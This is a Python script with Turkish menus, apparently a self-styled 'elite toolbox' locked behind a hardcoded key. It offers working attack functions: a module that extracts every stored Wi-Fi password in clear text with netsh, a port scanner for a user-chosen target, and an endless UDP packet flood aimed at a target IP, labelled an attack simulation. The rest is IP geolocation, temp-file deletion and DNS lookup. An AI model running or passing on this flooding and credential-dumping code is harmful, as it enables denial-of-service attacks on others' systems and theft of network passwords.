import os, sys, subprocess, time, socket, random, platform

def setup():
    try:
        from colorama import Fore, Style, init
        import requests
    except ImportError:
        print("Sistem bileşenleri hazırlanıyor...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])
        os.execv(sys.executable, ['python'] + sys.argv)

setup()
from colorama import Fore, Style, init
import requests
init(autoreset=True)

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
    {Fore.RED}      _______  __   __  __   __  __    _ 
            |       ||  | |  ||  |_|  ||  |  | |
            |    ___||  | |  ||       ||   |_| |
            |   |___ |  |_|  ||       ||       |
            |    ___||       | |     | |  _    |
            |   |___ |       ||   _   || | |   |
            |_______||_______||__| |__||_|  |__|
                  {Fore.WHITE}YUXYN ELITE TOOLBOX v16.0{Fore.RED}
    """)

# --- MODÜLLER ---

def wifi_mod():
    print(f"\n{Fore.CYAN}[*] Wi-Fi Şifreleri Taranıyor...")
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            try:
                res = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
                password = [b.split(":")[1][1:-1] for b in res if "Key Content" in b][0]
                print(f"{Fore.GREEN}Ağ: {Fore.WHITE}{i:<15} {Fore.GREEN}Şifre: {Fore.YELLOW}{password}")
            except: print(f"{Fore.GREEN}Ağ: {Fore.WHITE}{i:<15} {Fore.RED}Şifre: YOK/AÇIK")
    except: print(f"{Fore.RED}[!] Yönetici olarak çalıştırın!")

def system_info():
    print(f"\n{Fore.CYAN}[*] Sistem Bilgileri:")
    print(f"{Fore.WHITE}İşletim Sistemi: {platform.system()} {platform.release()}")
    print(f"{Fore.WHITE}İşlemci: {platform.processor()}")
    print(f"{Fore.WHITE}Bilgisayar Adı: {socket.gethostname()}")
    print(f"{Fore.WHITE}Yerel IP: {socket.gethostbyname(socket.gethostname())}")

def port_scan():
    target = input(f"\n{Fore.YELLOW}Hedef IP/Site: ")
    ports = [21, 22, 23, 80, 443, 3306, 3389, 8080]
    print(f"{Fore.CYAN}[*] Kritik portlar kontrol ediliyor...")
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.4)
        if s.connect_ex((target, port)) == 0:
            print(f"{Fore.GREEN}[+] Port {port}: AÇIK")
        s.close()

def stress_test():
    target = input(f"\n{Fore.YELLOW}Hedef IP: ")
    print(f"{Fore.RED}[!] Saldırı Simülasyonu Başladı (Durdur: CTRL+C)")
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(1024), (target, 80))
            print(f"{Fore.RED}>>> Veri Paketi Gönderildi!", end="\r")
    except: print(f"\n{Fore.YELLOW}[!] Test Durduruldu.")

def main():
    banner()
    if input(f"{Fore.YELLOW}Giriş Anahtarı: ") != "levy123": return
    
    while True:
        banner()
        print(f"{Fore.WHITE}[1] Wi-Fi Şifreleri    [6] Şifre Üretici")
        print(f"{Fore.WHITE}[2] IP Bilgi (Konum)   [7] Sistem Temizle")
        print(f"{Fore.WHITE}[3] Port Tarama        [8] Sistem Özellikleri")
        print(f"{Fore.WHITE}[4] Stress Test (UDP)  [9] DNS Çözücü")
        print(f"{Fore.WHITE}[5] İnternet Kontrol   [10] GitHub Sayfası")
        print(f"{Fore.WHITE}[0] Çıkış")
        
        sec = input(f"\n{Fore.RED}Yuxyn Elite > {Fore.WHITE}")
        
        if sec == "1": wifi_mod()
        elif sec == "2":
            target = input("IP: ")
            try:
                r = requests.get(f"http://ip-api.com/json/{target}").json()
                print(f"{Fore.GREEN}{r['country']} / {r['city']} / ISP: {r['isp']}")
            except: print(f"{Fore.RED}Hata!")
        elif sec == "3": port_scan()
        elif sec == "4": stress_test()
        elif sec == "5":
            try:
                requests.get("https://google.com", timeout=3)
                print(f"{Fore.GREEN}Bağlantı Durumu: ÇEVRİMİÇİ")
            except: print(f"{Fore.RED}Bağlantı Durumu: ÇEVRİMDIŞI")
        elif sec == "6": print(f"{Fore.GREEN}Pass: {''.join(random.sample('ABCabc123!@#', 12))}")
        elif sec == "7": 
            os.system("del /q /s %temp%\\* > nul 2>&1")
            print(f"{Fore.GREEN}Geçici dosyalar temizlendi!")
        elif sec == "8": system_info()
        elif sec == "9":
            host = input("Site: ")
            try: print(f"{Fore.GREEN}IP: {socket.gethostbyname(host)}")
            except: print(f"{Fore.RED}Bulunamadı.")
        elif sec == "10": os.system("start https://github.com/Yuxyn/Yuxyn-Elite-Toolbox")
        elif sec == "0": break
        input(f"\n{Fore.CYAN}Devam etmek için Enter...")

if __name__ == "__main__":
    main()